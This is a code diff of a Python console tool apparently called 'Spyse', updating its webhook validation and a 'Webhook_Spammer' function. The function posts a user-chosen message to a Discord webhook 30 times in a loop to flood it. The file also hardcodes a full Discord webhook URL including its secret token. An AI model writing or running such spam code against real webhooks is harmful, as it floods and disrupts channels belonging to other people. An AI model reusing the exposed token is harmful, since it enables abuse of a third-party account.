@@ -14,7 +14,7 @@ from selenium import webdriver
 
 console = get_console()
 
-maj = 'V3.5.1'
+maj = 'V3.5.2'
 webhook = "https://discord.com/api/webhooks/1024752077622218823/2ggeu3AOw5W_mw2FUsNSP_v0SPrZeEM5F26wZyXK6E6DKKS5yZWAtlRn0011BC4phDph"
 #please don't spam or nuke this one it's really important for the tool
 
@@ -61,17 +61,17 @@ def validate_webhook(webhook):
         print(stat)
         try: 
             stat = stat['name']
-            error = 3 
+            error = "3" 
         except:
             stat = stat['message']
-            error = 2 
+            error = "2" 
     except:
-        error = 1
+        error = "1"
     if error == "3":
         pass
     if error == '2':
-        console.print('[green][[/green][purple]![/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
-        console.print(f"[green][[/green][purple]![/purple][green]][/green]Error = {stat}")
+        console.print('[green][[/green][purple]![/purple][green]][/green][purple] Webhook invalid ! [/purple] ')
+        console.print(f"[green][[/green][purple]![/purple][green]][/green] Error = {stat}")
         console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
         main()
     if error == '1':
@@ -232,14 +232,17 @@ def Webhook_Spammer():
         os.system(f'Title - Spyse - Webhook spamer')
         webhook = console.input('[green][[/green][purple]?[/purple][green]][/green] enter [purple]webhook[/purple] : ')
         validate_webhook(webhook)
+        r = requests.get(webhook).json()
+        name = r['name']
         try:
             Message = console.input("[green][[/green][purple]?[/purple][green]][/green] what you want to [purple]say[/purple] : ")
             print("\"ctrl + c\" at anytime to stop\n")
             time.sleep(1.5)
             for i in range(30):
+                console.print(f'[green][[/green][purple]![/purple][green]][/green] Message sent to [purple]{name}[/purple] ')
                 response = requests.post(
                     webhook, json = {"content" : Message}, params = {'wait' : True})
-            console.print(f'[green][[/green][purple]?[/purple][green]][/green] Spammed Webhook Successfully! ')
+            console.print(f'[green][[/green][purple]?[/purple][green]][/green] Spammed [purple]Webhook Successfully! [/purple]')
             console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
             main()
         except:
